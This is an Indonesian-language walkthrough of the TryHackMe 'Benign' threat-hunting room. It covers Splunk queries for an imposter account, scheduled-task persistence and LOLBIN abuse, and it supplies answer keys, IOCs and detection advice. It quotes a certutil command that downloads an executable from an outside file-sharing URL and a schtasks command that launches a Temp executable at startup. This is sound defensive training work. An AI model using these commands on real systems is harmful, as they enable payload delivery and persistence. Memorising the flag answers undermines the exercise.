# TryHackMe: Benign — Threat Hunting with Splunk

**Investigasi host HR yang ter-compromise: LOLBIN (`certutil`), Scheduled Task persistence, dan akun imposter**

| | |
|---|---|
| **Platform** | TryHackMe, room *Benign* |
| **Kategori** | Blue Team / SOC, Threat Hunting |
| **Tools** | Splunk Enterprise, LOLBAS Project |
| **Sumber data** | Windows Event ID 4688 (process creation), index `win_eventlogs` |
| **Teknik MITRE ATT&CK** | T1105, T1053.005, T1036 |

---

## Ringkasan Temuan

Satu host di departemen HR terindikasi ter-compromise. Dari log proses, ditemukan rantai aktivitas berikut:

1. Seorang user HR (`haroon`) memakai **`certutil.exe`** (LOLBIN) untuk mengunduh payload `benign.exe` dari situs file-sharing **controlc.com**.
2. Seorang user HR (`Chris.fort`) membuat **scheduled task** `OfficUpdater` yang menjalankan `update.exe` dari folder Temp setiap sistem *start*, yaitu pola **persistence**.
3. Terdapat **akun imposter `Amel1a`**, nama yang meniru karyawan Marketing `Amelia` dengan mengganti huruf `i` menjadi angka `1`.

### Timeline

| Waktu (UTC) | User | Aktivitas | Teknik |
|---|---|---|---|
| 2022-03-04 10:38:28 | `haroon` | `certutil.exe -urlcache -f` mengunduh `benign.exe` dari controlc.com | T1105 |
| 2022-03-06 14:23:40 | `Chris.fort` | `schtasks.exe /create` membuat task `OfficUpdater` (`/sc onstart`) | T1053.005 |

---

## Skenario

Salah satu IDS milik klien mendeteksi eksekusi proses yang mencurigakan, menandakan salah satu host dari departemen HR telah ter-compromise. Beberapa tool untuk pengumpulan informasi jaringan dan *scheduled task* dieksekusi, yang menguatkan kecurigaan tersebut. Karena keterbatasan sumber daya, hanya log eksekusi proses dengan **Event ID 4688** yang bisa ditarik dan di-ingest ke Splunk dengan index **`win_eventlogs`**.

### Informasi Jaringan

Jaringan terbagi menjadi tiga segmen logis. Daftar ini menjadi **baseline** untuk mendeteksi anomali.

| Departemen | User |
|---|---|
| IT | James, Moin, Katrina |
| HR | Haroon, Chris, Diana |
| Marketing | Bell, Amelia, Deepak |

---

## Investigasi

### 1. Berapa banyak log yang di-ingest pada bulan Maret 2022?

**Jawaban: `13959`**

Di Splunk, atur time picker ke **Date Range → Between** `03/01/2022` dan `04/01/2022`, lalu jalankan:

```spl
index=*
```

Mengatur rentang waktu lebih dulu penting agar hitungan hanya mencakup bulan yang ditanyakan, bukan seluruh data di index.

![Jumlah event Maret 2022](images/01-splunk-date-range-13959-events.png)

---

### 2. Imposter Alert: siapa nama akun imposter di log?

**Jawaban: `Amel1a`**

Pendekatan: enumerasi semua user unik, lalu bandingkan dengan daftar resmi karyawan dari soal. Cara ini lebih andal daripada menebak user karena daftar diambil langsung dari data.

```spl
index=* HostName=HR_02
| stats count by UserName
```

Hasilnya memuat akun `Amel1a` yang **tidak ada** di daftar resmi. Namanya sangat mirip dengan `Amelia` (Marketing), dengan huruf `i` diganti angka `1`. Ini teknik penyamaran umum agar akun palsu lolos dari pemeriksaan sekilas.

![Enumerasi user pada host HR_02](images/02-imposter-user-amel1a.png)

---

### 3. User HR mana yang menjalankan scheduled task?

**Jawaban: `Chris.fort`**

Di Windows, scheduled task dibuat lewat utilitas **`schtasks.exe`**. Karena log yang tersedia adalah process creation (4688), setiap eksekusinya tercatat. Jadi aku mencari berdasarkan **perilaku** (pemakaian `schtasks`) lalu menyaring ke user HR.

```spl
index=* schtasks (UserName=Haroon OR UserName=Chris.Fort OR UserName=Diana)
| table _time, UserName, HostName, ProcessName, CommandLine, EventTime
| sort _time
```

![Hasil pencarian schtasks](images/03-schtasks-persistence-chris-fort.png)

Command line yang ditemukan:

```text
schtasks.exe /create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart
```

Analisis parameter:

| Parameter | Arti | Kenapa mencurigakan |
|---|---|---|
| `/create` | Membuat task baru | Task baru dibuat tanpa konteks administratif |
| `/tn OfficUpdater` | Nama task | Menyerupai nama updater resmi (typo "Offic") agar tidak menarik perhatian |
| `/tr ...\Temp\update.exe` | Program yang dijalankan | Executable berada di folder Temp milik user, lokasi yang lazim dipakai malware |
| `/sc onstart` | Jadwal | Berjalan setiap sistem *start*, artinya **persistence** |

> **Catatan:** pada screenshot, query tertulis `daina` (typo dari `Diana`) dan kolom `Hostname` kosong. Field di data ini bernama `HostName` (Splunk case-sensitive). Query di atas sudah dikoreksi.

---

### 4. User HR mana yang mengeksekusi system process (LOLBIN) untuk mengunduh payload dari file-sharing host?

**Jawaban: `haroon`**

**LOLBIN** = **L**iving **O**ff the **L**and **Bin**ary: program bawaan Windows yang sah dan ditandatangani Microsoft, tetapi disalahgunakan attacker. Alasannya: tidak perlu membawa malware sendiri, prosesnya tepercaya sehingga sering lolos dari whitelist, dan sudah tersedia di hampir semua mesin Windows.

Daftar LOLBIN beserta cara penyalahgunaannya bisa dilihat di [LOLBAS Project](https://lolbas-project.github.io/). Dari sana aku menduga `certutil`, yang memang dapat dipakai untuk mengunduh file.

```spl
index=* certutil (UserName=Haroon OR UserName=Chris.Fort OR UserName=Diana)
| table _time, UserName, HostName, ProcessName, CommandLine, EventTime
| sort _time
```

![Hasil pencarian certutil](images/04-certutil-download-haroon.png)

---

### 5. LOLBIN apa yang dipakai untuk mengunduh payload dari internet?

**Jawaban: `certutil.exe`**

Proses `C:\Windows\System32\certutil.exe` yang dijalankan `haroon` (lihat screenshot di soal 4).

---

### 6. Situs pihak ketiga mana yang diakses untuk mengunduh payload?

**Jawaban: `controlc.com`**

Terlihat dari command line:

```text
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

Opsi `-urlcache -f` memaksa `certutil` mengunduh dari URL dan menyimpannya sebagai file lokal bernama `benign.exe`.

---

### 7. Apa nama file yang disimpan di host dari server C2?

**Jawaban: `benign.exe`**

Argumen terakhir pada command line `certutil` adalah nama file output.

---

### 8. File yang diunduh berisi pola `THM{..........}`. Apa polanya?

**Jawaban: `THM{KJ&*H^B0}`**

Membuka URL dari command line (`https://controlc.com/e4d11035`) menampilkan isi `flag.txt`.

![Isi halaman controlc.com](images/05-controlc-flag-payload-page.png)

---

### 9. URL apa yang dihubungi oleh host yang terinfeksi?

**Jawaban: `https://controlc.com/e4d11035`**

---

## Indicators of Compromise (IOC)

| Tipe | Nilai |
|---|---|
| URL | `hxxps://controlc[.]com/e4d11035` |
| Domain | `controlc[.]com` |
| File diunduh | `benign.exe` |
| File persistence | `C:\Users\Chris.fort\AppData\Local\Temp\update.exe` |
| Scheduled task | `OfficUpdater` |
| LOLBIN | `C:\Windows\System32\certutil.exe` |
| Akun mencurigakan | `Amel1a` (lookalike dari `Amelia`) |
| Host | `HR_02` |

## MITRE ATT&CK

| ID | Teknik | Bukti |
|---|---|---|
| T1105 | Ingress Tool Transfer | `certutil -urlcache -f` mengunduh `benign.exe` |
| T1053.005 | Scheduled Task/Job: Scheduled Task | `schtasks /create ... /sc onstart` |
| T1036 | Masquerading | Nama task `OfficUpdater` dan akun lookalike `Amel1a` |

## Rekomendasi Deteksi

- Buat alert untuk `certutil.exe` dengan argumen `-urlcache` atau URL `http(s)`.
- Buat alert untuk `schtasks.exe /create` yang menunjuk ke path `AppData` atau `Temp`.
- Bandingkan daftar `UserName` dengan direktori resmi (misalnya Active Directory) untuk menemukan akun lookalike.
- Aktifkan *command-line logging* pada Event ID 4688, karena tanpa itu aktivitas seperti di atas tidak akan terlihat.

## Pelajaran yang Didapat

- Mulai dari **baseline** (daftar user resmi), cari yang menyimpang, baru selidiki mendalam. Menebak user tidak skalabel saat log mencapai jutaan baris.
- Mencari berdasarkan **perilaku** (`schtasks`, `certutil`) lebih efektif daripada mencari berdasarkan user. Sebaiknya jalankan tanpa filter user dulu agar tidak melewatkan akun lain.
- Dua aktivitas jahat berasal dari **dua user HR berbeda**, sehingga cakupan insiden perlu diperiksa lebih lanjut (hipotesis, belum dibuktikan oleh data di room ini).
- Nama field Splunk bersifat **case-sensitive** (`HostName` bukan `Hostname`).
